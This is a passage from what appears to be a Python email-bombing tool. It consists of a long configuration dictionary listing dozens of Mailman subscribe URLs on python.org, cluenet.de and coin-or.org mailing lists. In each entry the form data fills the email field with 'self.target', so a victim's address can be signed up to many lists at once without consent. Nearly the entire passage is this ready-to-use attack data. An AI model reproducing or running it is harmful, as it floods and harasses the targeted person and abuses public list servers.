                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'vfhcS': {
                'url': 'https://mail.python.org/mailman/subscribe/python-hu',
                'token_url': 'https://mail.python.org/mailman/listinfo/python-hu',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'UTyyy': {
                'url': 'https://mail.python.org/mailman/subscribe/python-ir',
                'token_url': 'https://mail.python.org/mailman/listinfo/python-ir',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'uFotT': {
                'url': 'https://mail.python.org/mailman/subscribe/python-ke',
                'token_url': 'https://mail.python.org/mailman/listinfo/python-ke',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'hswPY': {
                'url': 'https://mail.python.org/mailman/subscribe/python-latam',
                'token_url': 'https://mail.python.org/mailman/listinfo/python-latam',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'sEKPl': {
                'url': 'https://mail.python.org/mailman/subscribe/python-ldap',
                'token_url': 'https://mail.python.org/mailman/listinfo/python-ldap',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Nehli': {
                'url': 'https://mail.python.org/mailman/subscribe/python-legal-sig',
                'token_url': 'https://mail.python.org/mailman/listinfo/python-legal-sig',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'eeisQ': {
                'url': 'https://mail.python.org/mailman/subscribe/python-list',
                'token_url': 'https://mail.python.org/mailman/listinfo/python-list',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'CeQSZ': {
                'url': 'https://mail.python.org/mailman/subscribe/python-mode',
                'token_url': 'https://mail.python.org/mailman/listinfo/python-mode',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'akFIx': {
                'url': 'https://mail.python.org/mailman/subscribe/python-mx',
                'token_url': 'https://mail.python.org/mailman/listinfo/python-mx',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ihGQz': {
                'url': 'https://mail.python.org/mailman/subscribe/python-nigeria',
                'token_url': 'https://mail.python.org/mailman/listinfo/python-nigeria',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'sKdwy': {
                'url': 'https://mail.python.org/mailman/subscribe/python-nl',
                'token_url': 'https://mail.python.org/mailman/listinfo/python-nl',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'qgHHf': {
                'url': 'https://mail.python.org/mailman/subscribe/python-ro',
                'token_url': 'https://mail.python.org/mailman/listinfo/python-ro',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'IOfNA': {
                'url': 'https://mail.python.org/mailman/subscribe/python-se',
                'token_url': 'https://mail.python.org/mailman/listinfo/python-se',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'SnDfy': {
                'url': 'https://mail.python.org/mailman/subscribe/python-togo',
                'token_url': 'https://mail.python.org/mailman/listinfo/python-togo',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'NddRC': {
                'url': 'https://mail.python.org/mailman/subscribe/python-uk',
                'token_url': 'https://mail.python.org/mailman/listinfo/python-uk',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'gDwNE': {
                'url': 'https://mail.python.org/mailman/subscribe/python-win32',
                'token_url': 'https://mail.python.org/mailman/listinfo/python-win32',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'EGufK': {
                'url': 'https://mail.python.org/mailman/subscribe/pythoncad',
                'token_url': 'https://mail.python.org/mailman/listinfo/pythoncad',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'rnwkX': {
                'url': 'https://mail.python.org/mailman/subscribe/pythonce',
                'token_url': 'https://mail.python.org/mailman/listinfo/pythonce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'YNJKf': {
                'url': 'https://mail.python.org/mailman/subscribe/pythonexpress',
                'token_url': 'https://mail.python.org/mailman/listinfo/pythonexpress',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'EutzW': {
                'url': 'https://mail.python.org/mailman/subscribe/pythonmac-sig',
                'token_url': 'https://mail.python.org/mailman/listinfo/pythonmac-sig',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'GNCWp': {
                'url': 'https://mail.python.org/mailman/subscribe/scikit-learn',
                'token_url': 'https://mail.python.org/mailman/listinfo/scikit-learn',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kdDVM': {
                'url': 'https://mail.python.org/mailman/subscribe/scipy-dev',
                'token_url': 'https://mail.python.org/mailman/listinfo/scipy-dev',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'JcAVV': {
                'url': 'https://mail.python.org/mailman/subscribe/scipy-organizers',
                'token_url': 'https://mail.python.org/mailman/listinfo/scipy-organizers',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'gnHsJ': {
                'url': 'https://mail.python.org/mailman/subscribe/scipy-svn',
                'token_url': 'https://mail.python.org/mailman/listinfo/scipy-svn',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'UJhsY': {
                'url': 'https://mail.python.org/mailman/subscribe/scipy-user',
                'token_url': 'https://mail.python.org/mailman/listinfo/scipy-user',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'QNZDQ': {
                'url': 'https://mail.python.org/mailman/subscribe/seattle-pug',
                'token_url': 'https://mail.python.org/mailman/listinfo/seattle-pug',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'vhJAS': {
                'url': 'https://mail.python.org/mailman/subscribe/soap',
                'token_url': 'https://mail.python.org/mailman/listinfo/soap',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'pUdmz': {
                'url': 'https://mail.python.org/mailman/subscribe/spambayes',
                'token_url': 'https://mail.python.org/mailman/listinfo/spambayes',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ZwNnr': {
                'url': 'https://mail.python.org/mailman/subscribe/spambayes-announce',
                'token_url': 'https://mail.python.org/mailman/listinfo/spambayes-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Ukgdb': {
                'url': 'https://mail.python.org/mailman/subscribe/spambayes-bugs',
                'token_url': 'https://mail.python.org/mailman/listinfo/spambayes-bugs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'IZwAv': {
                'url': 'https://mail.python.org/mailman/subscribe/spambayes-checkins',
                'token_url': 'https://mail.python.org/mailman/listinfo/spambayes-checkins',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'fujuk': {
                'url': 'https://mail.python.org/mailman/subscribe/spambayes-dev',
                'token_url': 'https://mail.python.org/mailman/listinfo/spambayes-dev',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ZVANP': {
                'url': 'https://mail.python.org/mailman/subscribe/sponsors-wg',
                'token_url': 'https://mail.python.org/mailman/listinfo/sponsors-wg',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'rkMHd': {
                'url': 'https://mail.python.org/mailman/subscribe/sprint-mentors',
                'token_url': 'https://mail.python.org/mailman/listinfo/sprint-mentors',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'RlScs': {
                'url': 'https://mail.python.org/mailman/subscribe/sunpiggies',
                'token_url': 'https://mail.python.org/mailman/listinfo/sunpiggies',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'bLcsq': {
                'url': 'https://mail.python.org/mailman/subscribe/tehpug',
                'token_url': 'https://mail.python.org/mailman/listinfo/tehpug',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'GvFKg': {
                'url': 'https://mail.python.org/mailman/subscribe/texas',
                'token_url': 'https://mail.python.org/mailman/listinfo/texas',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'sGmXK': {
                'url': 'https://mail.python.org/mailman/subscribe/tkinter-discuss',
                'token_url': 'https://mail.python.org/mailman/listinfo/tkinter-discuss',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'SqTPZ': {
                'url': 'https://mail.python.org/mailman/subscribe/trizpug',
                'token_url': 'https://mail.python.org/mailman/listinfo/trizpug',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'sxGQB': {
                'url': 'https://mail.python.org/mailman/subscribe/tutor',
                'token_url': 'https://mail.python.org/mailman/listinfo/tutor',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'eyrpV': {
                'url': 'https://mail.python.org/mailman/subscribe/web-sig',
                'token_url': 'https://mail.python.org/mailman/listinfo/web-sig',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'PJQcr': {
                'url': 'https://mail.python.org/mailman/subscribe/wheel-builders',
                'token_url': 'https://mail.python.org/mailman/listinfo/wheel-builders',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'nCovI': {
                'url': 'https://mail.python.org/mailman/subscribe/winnipeg',
                'token_url': 'https://mail.python.org/mailman/listinfo/winnipeg',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ndwmN': {
                'url': 'https://mail.python.org/mailman/subscribe/xml-sig',
                'token_url': 'https://mail.python.org/mailman/listinfo/xml-sig',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'tMTyT': {
                'url': 'http://lists.cluenet.de/mailman/subscribe/dns-report',
                'token_url': 'http://lists.cluenet.de/mailman/listinfo/dns-report',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'lCqBG': {
                'url': 'http://lists.cluenet.de/mailman/subscribe/ipv6-ops',
                'token_url': 'http://lists.cluenet.de/mailman/listinfo/ipv6-ops',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'bBqFt': {
                'url': 'https://list.coin-or.org/mailman/subscribe/abacus',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/abacus',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'oseJD': {
                'url': 'https://list.coin-or.org/mailman/subscribe/abacus-tickets',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/abacus-tickets',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'swpUU': {
                'url': 'https://list.coin-or.org/mailman/subscribe/adol-c',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/adol-c',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'WQvgq': {
                'url': 'https://list.coin-or.org/mailman/subscribe/adol-c-tickets',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/adol-c-tickets',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'WFtQS': {
                'url': 'https://list.coin-or.org/mailman/subscribe/aimmslinks',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/aimmslinks',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'OWLjq': {
                'url': 'https://list.coin-or.org/mailman/subscribe/aimmslinks-tickets',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/aimmslinks-tickets',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'lnejw': {
                'url': 'https://list.coin-or.org/mailman/subscribe/applicableinstances',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/applicableinstances',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'CkAFM': {
                'url': 'https://list.coin-or.org/mailman/subscribe/applicableinstances-tickets',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/applicableinstances-tickets',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'VrZEs': {
                'url': 'https://list.coin-or.org/mailman/subscribe/bca-tickets',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/bca-tickets',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'CaoNt': {
                'url': 'https://list.coin-or.org/mailman/subscribe/bcp-tickets',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/bcp-tickets',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'CDJse': {
                'url': 'https://list.coin-or.org/mailman/subscribe/bonmin',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/bonmin',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'HFatc': {
                'url': 'https://list.coin-or.org/mailman/subscribe/bonmin-tickets',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/bonmin-tickets',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'XBMeq': {
                'url': 'https://list.coin-or.org/mailman/subscribe/buildtools',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/buildtools',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'IFsXQ': {
                'url': 'https://list.coin-or.org/mailman/subscribe/buildtools-tickets',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/buildtools-tickets',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'fQEUz': {
                'url': 'https://list.coin-or.org/mailman/subscribe/cbc',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/cbc',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'jllFd': {
                'url': 'https://list.coin-or.org/mailman/subscribe/cbc-tickets',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/cbc-tickets',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'dxFAE': {
                'url': 'https://list.coin-or.org/mailman/subscribe/cgc',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/cgc',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'hTfJZ': {
                'url': 'https://list.coin-or.org/mailman/subscribe/cgc-tickets',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/cgc-tickets',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'jGTxS': {
                'url': 'https://list.coin-or.org/mailman/subscribe/cgl',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/cgl',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'EJcqW': {
                'url': 'https://list.coin-or.org/mailman/subscribe/cgl-managers',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/cgl-managers',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'hdlCo': {
                'url': 'https://list.coin-or.org/mailman/subscribe/cgl-tickets',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/cgl-tickets',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'iTpOK': {
                'url': 'https://list.coin-or.org/mailman/subscribe/chipps',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/chipps',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'dXGHn': {
                'url': 'https://list.coin-or.org/mailman/subscribe/ots',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/ots',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'jLqFk': {
                'url': 'https://list.coin-or.org/mailman/subscribe/ots-tickets',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/ots-tickets',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kVlZY': {
                'url': 'https://list.coin-or.org/mailman/subscribe/paver',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/paver',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'lGYIE': {
                'url': 'https://list.coin-or.org/mailman/subscribe/paver-tickets',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/paver-tickets',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'GGBxT': {
                'url': 'https://list.coin-or.org/mailman/subscribe/pfunc',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/pfunc',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'EfsAn': {
                'url': 'https://list.coin-or.org/mailman/subscribe/pfunc-tickets',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/pfunc-tickets',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'wlQTH': {
                'url': 'https://list.coin-or.org/mailman/subscribe/project-managers',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/project-managers',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'AITGx': {
                'url': 'https://list.coin-or.org/mailman/subscribe/pulp',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/pulp',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'URvgH': {
                'url': 'https://list.coin-or.org/mailman/subscribe/pulp-tickets',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/pulp-tickets',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'nhXAh': {
                'url': 'https://list.coin-or.org/mailman/subscribe/qapsolver',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/qapsolver',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'slBbi': {
                'url': 'https://list.coin-or.org/mailman/subscribe/qapsolver-tickets',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/qapsolver-tickets',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'jcbqk': {
                'url': 'https://list.coin-or.org/mailman/subscribe/qpoases',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/qpoases',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'GOaTh': {
                'url': 'https://list.coin-or.org/mailman/subscribe/qpoases-tickets',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/qpoases-tickets',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'mJiry': {
                'url': 'https://list.coin-or.org/mailman/subscribe/rbfopt',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/rbfopt',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'cfbfK': {
                'url': 'https://list.coin-or.org/mailman/subscribe/rbfopt-tickets',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/rbfopt-tickets',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'RfqGj': {
                'url': 'https://list.coin-or.org/mailman/subscribe/rehearse',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/rehearse',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'EDaWj': {
                'url': 'https://list.coin-or.org/mailman/subscribe/rehearse-tickets',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/rehearse-tickets',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'hARKp': {
                'url': 'https://list.coin-or.org/mailman/subscribe/rose',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/rose',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'hTLwL': {
                'url': 'https://list.coin-or.org/mailman/subscribe/rose-tickets',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/rose-tickets',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'SUSnN': {
                'url': 'https://list.coin-or.org/mailman/subscribe/shot',
